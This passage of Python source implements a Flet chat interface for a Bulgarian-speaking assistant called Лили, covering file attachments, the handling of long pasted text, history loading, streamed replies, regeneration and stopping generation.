        Our own scrolling only ever moves down, so a user event pointing back
        (mouse wheel, touch) or a negative delta (dragging the scrollbar) means
        the reader went up to older text and the stream must stop pulling the
        view down. Arriving at the bottom again resumes following.
        """
        scrolled_up = (e.event_type == "user" and e.direction == "forward") or (
            e.event_type == "update" and (e.scroll_delta or 0) < 0
        )
        if scrolled_up:
            self._follow_bottom = False
        elif (e.max_scroll_extent or 0) - (e.pixels or 0) <= BOTTOM_FOLLOW_THRESHOLD:
            self._follow_bottom = True

    def toggle_emoji_picker(self, e=None):
        picker = self.emoji_picker
        picker.visible = not picker.visible
        self.emoji_btn.icon = (
            ft.icons.EMOJI_EMOTIONS if picker.visible else ft.icons.EMOJI_EMOTIONS_OUTLINED
        )
        safe_update(self, picker, self.emoji_btn)
        # The list got shorter or taller; keep its end in view.
        self._follow_stream()

    def insert_emoji(self, emoji: str):
        """Add ``emoji`` to the message being typed.

        The caret position of a TextField is not known to Python, so the emoji
        goes at the end of the text.
        """
        self._set_input((self.input_field.value or "") + emoji)
        if self.input_field.uid is not None:
            # focus() also sends the new value, and keeps the keyboard in the field.
            self.input_field.focus()

    def did_mount(self):
        if DEBUG_MOCK_SOURCES:
            self.add_message("assistant", "Здравейте! Аз съм Лили. Как мога да ви помогна днес?", sources=_get_mock_sources())
        if self.page is not None:
            if self.file_picker not in self.page.overlay:
                self.page.overlay.append(self.file_picker)
            # The files first, the history last: the history is what the view waits for.
            self._attachments_task = self.page.run_task(self.load_attachments)
            self._load_task = self.page.run_task(self.load_history)

    def will_unmount(self):
        self._cancel_running_tasks()
        if self.page is not None and self.file_picker in self.page.overlay:
            self.page.overlay.remove(self.file_picker)

    # ------------------------------------------------------------ attached files
    def _set_input(self, text: str) -> None:
        """Put text into the input field from the code, not from the user.

        The change event only comes from the user's typing; the remembered text has
        to follow the field, or the next paste would be measured against old text.
        """
        self.input_field.value = text
        self._input_text = text

    async def load_attachments(self, *_args) -> None:
        """Read the files attached to the open conversation and show them."""
        session_id = self.session_id
        try:
            found = await self.api_client.list_attachments(session_id)
        except asyncio.CancelledError:
            raise
        except Exception as e:  # noqa: BLE001
            # Not worth a message on screen: the chat works without the row, and the
            # next attach or reload reads the list again.
            logger.warning("Failed to read the files of chat %s: %s", session_id[:8], e)
            return
        if session_id != self.session_id:
            return
        self.attachments = found
        self._render_attachments()

    def _render_attachments(self) -> None:
        """Draw one chip for every attached file; the row is hidden when there are none."""
        self.attachments_row.controls = [
            ft.Chip(
                label=ft.Text(f"{a.name} · {a.lines} реда", size=12),
                leading=ft.Icon(ft.icons.ATTACH_FILE, size=16),
                tooltip=(
                    f"~{a.tokens} токена, версия {a.version}. Лили вижда файла само в този разговор; "
                    "кръстчето го маха."
                ),
                delete_icon_tooltip="Махни файла от разговора",
                on_delete=self.on_attachment_delete,
                data=a.id,
            )
            for a in self.attachments
        ]
        self.attachments_row.visible = bool(self.attachments)
        safe_update(self, self.attachments_row)

    async def on_attachment_delete(self, e) -> None:
        attachment_id = e.control.data
        try:
            await self.api_client.delete_attachment(attachment_id)
        except asyncio.CancelledError:
            raise
        except Exception as ex:  # noqa: BLE001
            if isinstance(ex, APIError) and ex.status == 404:
                # Gone already (another window, or it expired): the list is just stale.
                logger.info("Attachment %s was already gone.", attachment_id)
            else:
                logger.error("Failed to remove attachment %s: %s", attachment_id, ex)
                show_snackbar(self.page, f"Файлът не беше махнат. {describe_error(ex)}")
                return
        await self.load_attachments()

    def on_attach_click(self, e) -> None:
        self.file_picker.pick_files(
            dialog_title="Прикачи файл към този разговор",
            allow_multiple=True,
            file_type=ft.FilePickerFileType.ANY,
        )

    async def on_attach_result(self, e: ft.FilePickerResultEvent) -> None:
        """Attach the chosen files; what cannot be attached is reported together at the end."""
        if not e.files:
            return
        attached: list[str] = []
        problems: list[str] = []
        for picked in e.files:
            if not picked.path:
                continue
            try:
                size = await asyncio.to_thread(lambda p=picked.path: Path(p).stat().st_size)
                if size > MAX_FILE_BYTES:
                    raise NotAttachable(f"{picked.name}: файлът е по-голям от {MAX_FILE_BYTES // 1024} KB")
                raw = await asyncio.to_thread(Path(picked.path).read_bytes)
                text = read_text_file(raw, picked.name)
                await self._store_attachment(picked.name, text)
            except asyncio.CancelledError:
                raise
            except NotAttachable as ex:
                logger.warning("Skipped %s: %s", picked.name, ex)
                problems.append(str(ex))
            except OSError as ex:
                logger.warning("Could not read %s: %s", picked.name, ex)
                problems.append(f"{picked.name}: файлът не може да се прочете")
            except Exception as ex:  # noqa: BLE001
                logger.error("Failed to attach %s: %s", picked.name, ex)
                problems.append(f"{picked.name}: {self._attach_error_text(ex)}")
            else:
                attached.append(picked.name)
        await self.load_attachments()
        if attached:
            show_snackbar(self.page, "Прикачено към разговора: " + ", ".join(attached), success=True)
        if problems:
            show_snackbar(self.page, "Не са прикачени — " + "; ".join(problems))

    async def _store_attachment(self, name: str, text: str) -> ChatAttachment:
        """Send one file to the backend for the open conversation."""
        return await self.api_client.upload_attachment(self.session_id, name, text)

    @staticmethod
    def _attach_error_text(error: BaseException) -> str:
        """Why the backend would not take a file, in words the user can act on."""
        if isinstance(error, APIError):
            if error.status == 413:
                return f"файлът е по-голям от {MAX_FILE_BYTES // 1024} KB"
            if error.status == 422:
                return "в разговора вече има 20 файла или файловете му надхвърлят 1 MB"
            if error.status < 500:
                return f"бекендът отказа файла ({error.message})"
        return describe_error(error)

    # ----------------------------------------------------- a long text becomes a file
    async def on_input_change(self, e) -> None:
        """Offer to attach a very long text as soon as it is pasted into the field.

        A message of that size would be refused by the backend, and the model reads a
        file better than a wall of text in a message. Only the jump counts: typing
        grows the field by a few characters at a time.
        """
        text = self.input_field.value or ""
        previous, self._input_text = self._input_text, text
        if self._offering or len(text) - len(previous) < PASTE_THRESHOLD_CHARS:
            return
        pasted = inserted_text(previous, text)
        tokens = estimate_message_tokens(pasted)
        self._offering = True
        try:
            accepted = await confirm_dialog(
                self.page,
                "Дълъг текст",
                f"Поставеният текст е голям (около {tokens} токена). Да го прикача като файл към разговора? "
                "Така Лили го чете по-добре и не се брои в дължината на съобщението.",
                confirm_text="Прикачи като файл",
                cancel_text="Остави в съобщението",
                destructive=False,
            )
            if not accepted:
                return
            if await self._attach_text_as_file(pasted):
                self._set_input(previous)
                safe_update(self, self.input_field)
        finally:
            self._offering = False

    async def _attach_text_as_file(self, text: str) -> str | None:
        """Attach text as ``paste_N.ext``; the name, or None (and a message) if it failed."""
        name = paste_file_name(text, {a.name for a in self.attachments})
        try:
            await self._store_attachment(name, text)
        except asyncio.CancelledError:
            raise
        except Exception as ex:  # noqa: BLE001
            logger.error("Failed to attach the pasted text: %s", ex)
            show_snackbar(self.page, f"Текстът не беше прикачен — {self._attach_error_text(ex)}")
            return None
        await self.load_attachments()
        show_snackbar(self.page, f"Прикачено като {name}", success=True)
        return name

    async def _offer_file_instead_of_message(self, text: str) -> None:
        """A message over the limit: offer a file instead of the backend's refusal.

        On yes the whole text becomes a file and the field gets a short note about it,
        ready to be sent or changed; nothing is sent by itself.
        """
        if self._offering:
            return
        self._offering = True
        try:
            accepted = await confirm_dialog(
                self.page,
                "Съобщението е твърде дълго",
                f"Съобщението е около {estimate_message_tokens(text)} токена, а най-много се пращат {MESSAGE_TOKEN_LIMIT}. "
                "Да го прикача като файл към разговора и в полето да остане кратка бележка?",
                confirm_text="Прикачи като файл",
                cancel_text="Ще го скъся",
                destructive=False,
            )
            if not accepted:
                return
            name = await self._attach_text_as_file(text)
            if name:
                self._set_input(f"Виж прикачения файл {name}.")
                safe_update(self, self.input_field)
        finally:
            self._offering = False

    async def load_history(self, *_args):
        """Render the session history with a single UI update at the end."""
        session_id = self.session_id
        try:
            messages = await self.api_client.get_messages(
                session_id=session_id, limit=HISTORY_REQUEST_LIMIT
            )
        except asyncio.CancelledError:
            raise
        except Exception as e:  # noqa: BLE001
            logger.error("Failed to load the history of chat %s: %s", session_id[:8], e)
            # Not when the user already moved to another chat: the failure is not theirs to see.
            if session_id == self.session_id:
                show_snackbar(self.page, f"Историята на чата не се зареди. {describe_error(e)}")
            return

        # The user switched sessions while the request was in flight.
        if session_id != self.session_id:
            return

        self.chat_list.controls.clear()
        self._last_assistant_msg = None
        self._last_assistant_row = None

        truncated = len(messages) > HISTORY_PAGE_SIZE
        visible = messages[-HISTORY_PAGE_SIZE:] if truncated else messages
        if truncated:
            self.chat_list.controls.append(
                ft.Text(
                    f"Показани са последните {HISTORY_PAGE_SIZE} съобщения.",
                    size=11,
                    color=ft.colors.GREY_500,
                )
            )

        last_msg_obj = None
        for msg in visible:
            last_msg_obj = self.add_message(
                msg.role or "user",
                msg.content or "",
                sources=msg.sources,
                notify=False,
            )

        # One update + one scroll for the whole history instead of one per message.
        safe_update(self)
        self.scroll_to_bottom()

        if last_msg_obj and last_msg_obj.role == "assistant":
            self._last_assistant_msg = last_msg_obj
            self._last_assistant_row = last_msg_obj._row
            last_msg_obj.set_regenerate_visible(True)

    def set_display_name(self, name: str) -> None:
        """Use ``name`` for the user's messages, the ones already on screen too."""
        self.display_name = name
        changed = []
        for row in self.chat_list.controls:
            container = row.controls[0] if getattr(row, "controls", None) else None
            message = getattr(container, "content", None)
            if isinstance(message, ChatMessage) and message.role == "user":
                message.sender_name = name
                message.sender_label.value = name
                changed.append(message.sender_label)
        if changed:
            safe_update(self, *changed)

    def add_message(self, role: str, text: str, sources: list | None = None, notify: bool = True) -> ChatMessage:
        is_user = role == "user"
        on_regenerate = self.regenerate_last if not is_user else None
        chat_message = ChatMessage(role=role, text=text, sources=sources, page=self.page, on_regenerate=on_regenerate, api_client=self.api_client, user_name=self.display_name)

        container_wrapper = ft.Container(
            content=chat_message,
            margin=ft.margin.only(left=50 if is_user else 0, right=0 if is_user else 50),
            expand=True,
            alignment=ft.alignment.top_right if is_user else ft.alignment.top_left,
        )

        row = ft.Row(
            controls=[container_wrapper],
            alignment=ft.MainAxisAlignment.END if is_user else ft.MainAxisAlignment.START,
        )

        self.chat_list.controls.append(row)
        chat_message._row = row
        if notify:
            safe_update(self)
            self.scroll_to_bottom()
        return chat_message

    async def _stream_response(self, chat_message, stream_coro, fallback_user_text=""):
        """Consume the SSE stream and paint it with as few updates as possible.

        Text chunks are buffered locally and flushed at most once per
        STREAM_FLUSH_INTERVAL; the view is updated once when the stream ends
        (instead of once per chunk, which used to walk and re-send the whole
        chat tree dozens of times per second).

        Returns the user-facing error text when the stream failed (it is also
        shown under the message), ``None`` when it finished or was stopped.
        """
        error_text = None
        stream_open = True
        last_chunk_time = time.time()

        async def show_activity_after_delay():
            try:
                while stream_open:
                    await asyncio.sleep(0.25)
                    if stream_open and (time.time() - last_chunk_time) >= ACTIVITY_INDICATOR_DELAY:
                        chat_message.show_activity_indicator()
            except asyncio.CancelledError:
                pass

        activity_task = None
        if self.page is not None:
            activity_task = self.page.run_task(show_activity_after_delay)

        pending_text = ""

        def flush_text():
            nonlocal pending_text
            if pending_text:
                chat_message.append_text(pending_text)
                pending_text = ""
                self._follow_stream()

        try:
            last_flush_time = time.time()

            async for chunk in stream_coro:
                last_chunk_time = time.time()
                chat_message.hide_activity_indicator()

                if self._stop_generation:
                    break

                if isinstance(chunk, dict):
                    if chunk.get("type") == "sources":
                        data = chunk.get("data", {})
                        if isinstance(data, list):
                            chat_message.add_sources(data)
                        elif isinstance(data, dict):
                            for key in ("facts", "chunks", "sources"):
                                if isinstance(data.get(key), list):
                                    chat_message.add_sources(data[key])
                        continue

                    if chunk.get("type") == "proposals":
                        chat_message.add_proposals(chunk.get("data") or [])
                        continue

                    for key in ("text", "content"):
                        value = chunk.get(key)
                        if isinstance(value, str):
                            pending_text += value

                    if "error" in chunk:
                        pending_text += f"\n\n**Грешка:** {chunk['error']}"

                    for source_key in ("facts", "chunks", "sources"):
                        if isinstance(chunk.get(source_key), list):
                            chat_message.add_sources(chunk[source_key])

                elif isinstance(chunk, str):
                    pending_text += chunk

                current_time = time.time()
                if current_time - last_flush_time >= STREAM_FLUSH_INTERVAL:
                    flush_text()
                    last_flush_time = current_time

            flush_text()

        except asyncio.CancelledError:
            flush_text()
        except Exception as ex:
            if isinstance(ex, (StreamError, APIError, httpx.TransportError)):
                logger.error("Chat request failed: %r", ex)
            else:
                logger.exception("Unexpected streaming error")
            flush_text()
            error_text = describe_error(ex)
            chat_message.finalize_with_error(error_text)
            # After a StreamError the backend already has the user's turn, so
            # putting it back in the input would only invite a duplicate.
            if fallback_user_text and not isinstance(ex, StreamError):
                self._set_input(fallback_user_text)
        finally:
            stream_open = False
            chat_message.hide_activity_indicator()
            if activity_task:
                activity_task.cancel()
            # Exactly one full-view update for the finished message.
            safe_update(self)
            if self.page is not None:
                self.page.run_task(self._scroll_after_layout)
        return error_text

    async def send_message_click(self, e):
        if self._is_streaming:
            # A response is already being streamed - ignore double submits.
            return

        text = (self.input_field.value or "").strip()
        if not text:
            return
        if estimate_message_tokens(text) > MESSAGE_TOKEN_LIMIT:
            # The backend would refuse it; a file is what a text this long should be.
            await self._offer_file_instead_of_message(text)
            return

        self._is_streaming = True
        self._stop_generation = False
        session_id = self.session_id
        # Only the length: what the user writes does not belong in the log.
        logger.info("Chat %s: message sent (%d characters).", session_id[:8], len(text))

        self._set_input("")
        if self.input_field.uid is not None:
            # focus() calls update() internally, so skip it for a detached field.
            self.input_field.focus()
        self._set_streaming_ui(True)

        if self._last_assistant_msg:
            self._last_assistant_msg.set_regenerate_visible(False)

        self.add_message("user", text, notify=False)
        chat_message = self.add_message("assistant", "", notify=False)
        safe_update(self)
        self.scroll_to_bottom()

        try:
            await self._stream_response(
                chat_message,
                self.api_client.stream_chat(session_id=session_id, content=text),
                text,
            )
        except asyncio.CancelledError:
            pass
        finally:
            self._is_streaming = False
            self._stop_generation = False
            self._set_streaming_ui(False)
            if session_id == self.session_id:
                self._last_assistant_msg = chat_message
                self._last_assistant_row = chat_message._row
                chat_message.set_regenerate_visible(True)

    async def regenerate_last(self, *_args):
        if self._is_streaming:
            return
        if not self._last_assistant_msg or not self._last_assistant_row:
            return
        if self._last_assistant_row not in self.chat_list.controls:
            return

        self._is_streaming = True
        self._stop_generation = False
        session_id = self.session_id
        logger.info("Chat %s: the last answer is regenerated.", session_id[:8])

        previous_msg = self._last_assistant_msg
        previous_row = self._last_assistant_row
        position = self.chat_list.controls.index(previous_row)

        previous_msg.set_regenerate_visible(False)
        self.chat_list.controls.remove(previous_row)
        self._last_assistant_msg = None
        self._last_assistant_row = None

        chat_message = None
        error = None
        try:
            self._set_streaming_ui(True)
            chat_message = self.add_message("assistant", "", notify=False)
            safe_update(self)
            self.scroll_to_bottom()
            error = await self._stream_response(
                chat_message, self.api_client.regenerate_chat(session_id=session_id)
            )
        except asyncio.CancelledError:
            pass
        finally:
            # "Стоп" ends the stream without an error, but the backend replaces
            # the stored answer only after a complete new one - an interrupted
            # regeneration leaves the old one in the history.
            stopped = self._stop_generation
            self._is_streaming = False
            self._stop_generation = False
            self._set_streaming_ui(False)
            if session_id == self.session_id:
                if error is not None or stopped or chat_message is None:
                    self._restore_previous_answer(
                        chat_message, previous_msg, previous_row, position
                    )
                    if error is not None:
                        show_snackbar(self.page, error)
                    elif stopped:
                        show_snackbar(
                            self.page,
                            "Регенерацията е спряна — предишният отговор е запазен.",
                            success=True,
                        )
                else:
                    self._last_assistant_msg = chat_message
                    self._last_assistant_row = chat_message._row
                    chat_message.set_regenerate_visible(True)

    def _restore_previous_answer(self, failed_message, previous_msg, previous_row, position):
        """Put the replaced answer back after a failed regeneration.

        The backend swaps the stored answer only once a complete new one exists,
        so after a failure the previous reply is still the one in the history.
        """
        if failed_message is not None and failed_message._row in self.chat_list.controls:
            self.chat_list.controls.remove(failed_message._row)
        if previous_row not in self.chat_list.controls:
            self.chat_list.controls.insert(
                min(position, len(self.chat_list.controls)), previous_row
            )
        self._last_assistant_msg = previous_msg
        self._last_assistant_row = previous_row
        previous_msg.set_regenerate_visible(True)
        safe_update(self)

    async def stop_generation_click(self, e):
        logger.info("Chat %s: generation stopped by the user.", self.session_id[:8])
        self._stop_generation = True
        self.api_client.cancel_stream()
        self.stop_btn.disabled = True
        safe_update(self, self.stop_btn)


